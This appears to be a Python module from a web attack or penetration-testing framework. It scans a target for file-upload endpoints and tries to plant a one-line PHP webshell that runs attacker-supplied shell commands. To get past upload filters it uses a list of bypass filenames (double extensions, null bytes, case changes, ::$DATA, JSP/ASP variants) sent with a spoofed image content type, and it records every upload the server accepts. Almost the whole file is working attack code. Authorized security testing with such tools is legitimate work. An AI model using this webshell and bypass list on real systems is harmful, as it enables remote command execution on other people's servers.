"""file_upload_bypass — file upload filter bypass (extension, mime, magic bytes)"""
from core.http import HttpClient

# upload endpoints to probe
UPLOAD_PATHS = ["/upload", "/api/upload", "/api/v1/upload", "/file/upload",
                "/files/upload", "/media/upload", "/avatar", "/profile/avatar",
                "/api/avatar", "/api/user/avatar"]

# PHP webshell variants
PHP_PAYLOAD = b"<?php system($_GET['c']); ?>"

# bypass payloads: (filename, content, content_type)
BYPASS_VARIANTS = [
    ("shell.php", PHP_PAYLOAD, "image/jpeg"),
    ("shell.php.jpg", PHP_PAYLOAD, "image/jpeg"),
    ("shell.jpg.php", PHP_PAYLOAD, "image/jpeg"),
    ("shell.pHp", PHP_PAYLOAD, "image/jpeg"),
    ("shell.php%00.jpg", PHP_PAYLOAD, "image/jpeg"),
    ("shell.php\x00.jpg", PHP_PAYLOAD, "image/jpeg"),
    ("shell.php5", PHP_PAYLOAD, "image/jpeg"),
    ("shell.phtml", PHP_PAYLOAD, "image/jpeg"),
    ("shell.pht", PHP_PAYLOAD, "image/jpeg"),
    ("shell.php.", PHP_PAYLOAD, "image/jpeg"),
    ("shell.php ", PHP_PAYLOAD, "image/jpeg"),
    ("shell.php::$DATA", PHP_PAYLOAD, "image/jpeg"),
    ("shell.jsp", PHP_PAYLOAD, "image/jpeg"),
    ("shell.jspx", PHP_PAYLOAD, "image/jpeg"),
    ("shell.asp", PHP_PAYLOAD, "image/jpeg"),
    ("shell.aspx", PHP_PAYLOAD, "image/jpeg"),
    ("shell.jsp;.jpg", PHP_PAYLOAD, "image/jpeg"),
]

class FileUploadBypass:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        findings = []

        for path in UPLOAD_PATHS:
            r0 = http.get(base + path)
            if not r0 or r0.status_code == 404: continue
            print(f"[upload] found: {path} ({r0.status_code})")
            logger.finding("upload_endpoint", "info", path)

            for filename, content, ctype in BYPASS_VARIANTS:
                files = {"file": (filename, content, ctype)}
                try:
                    r = http.s.post(base + path, files=files, timeout=session.timeout, verify=False)
                except Exception:
                    continue
                if not r: continue

                # success indicators
                low = r.text.lower()
                if r.status_code in (200, 201) and any(k in low for k in
                    ("uploaded", "success", "url", "path", "file", "saved")):
                    # check if filename or URL reflected
                    if filename.split(".")[0] in low or "upload" in low:
                        print(f"  [!] upload accepted: {filename}")
                        findings.append({"path": path, "filename": filename,
                                         "content_type": ctype, "severity": "high"})
                        logger.finding("file_upload", "high", f"{path} {filename}")

        print(f"[file_upload] total: {len(findings)}")
        return {"findings": findings}
